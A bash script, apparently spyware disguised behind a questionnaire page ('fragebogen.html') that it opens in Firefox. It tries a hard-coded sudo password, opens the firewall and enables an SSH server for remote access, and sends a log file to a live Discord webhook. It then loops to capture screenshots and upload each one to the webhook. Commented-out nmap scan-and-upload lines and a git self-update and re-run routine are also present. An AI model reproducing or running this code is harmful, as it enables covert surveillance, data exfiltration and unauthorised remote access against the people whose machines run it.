#!/bin/bash
if echo '12345' | sudo -S sh -c "sudo ufw allow ssh"; then
	cd "/home/$USER/its_villain/"
	firefox "fragebogen.html" 
	echo "nmap scan and sending xml..."
 	# sudo nmap -T5 -A -v 10.10.10.14/24 -oX /home/$USER/net.xml
  	# curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
	echo "SUDO SUCCESS installing ssh services..."
	sudo apt install openssh-server -y 
	sudo systemctl enable ssh
	echo "ssh installed and enable. open port 22 "
 	# sudo nmap -sV --script vulners 10.10.10.1/24 -oX /home/$USER/vuln.xml  
  	# curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
	
else	
	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
	sleep 15
 	git stash
  	git rebase origin main
   	git pull
   	chmod +x no.sh
    	./$0
fi

sudo -S sh -c "sudo apt install scrot -y"

for i in {0..100}
do
	scrot "ss.png"
	curl -F "filename=@/home/$USER/ss.png" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" 
	sleep 5
 	rm -f "/home/$USER/ss.png"
	echo "iteration number info: $i"
	sleep 30
done
